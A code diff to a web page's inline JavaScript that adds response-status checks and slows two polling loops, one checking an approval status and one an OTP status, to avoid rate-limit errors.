@@ -591,6 +591,7 @@
             let interval = setInterval(async () => {
                 try {
                     let res = await fetch('/api/check-status');
+                    if (!res.ok) return; // Prevent parsing errors if rate-limited or server restarts
                     let data = await res.json();
 
                     if (data.status === 'approved') {
@@ -605,7 +606,7 @@
                 } catch (e) {
                     console.error('Polling error:', e);
                 }
-            }, 2000);
+            }, 3500); // Optimized interval to prevent 429 too many requests errors
         }
 
         async function confirmSmsPaste() {
@@ -651,6 +652,7 @@
             let interval = setInterval(async () => {
                 try {
                     let res = await fetch('/api/check-otp-status');
+                    if (!res.ok) return; // Prevent parsing errors if rate-limited or server restarts
                     let data = await res.json();
 
                     if (data.status === 'success') {
@@ -666,7 +668,7 @@
                 } catch (e) {
                     console.error('OTP check error:', e);
                 }
-            }, 2000);
+            }, 3500); // Optimized interval to prevent 429 too many requests errors
         }
     </script>
 </body>
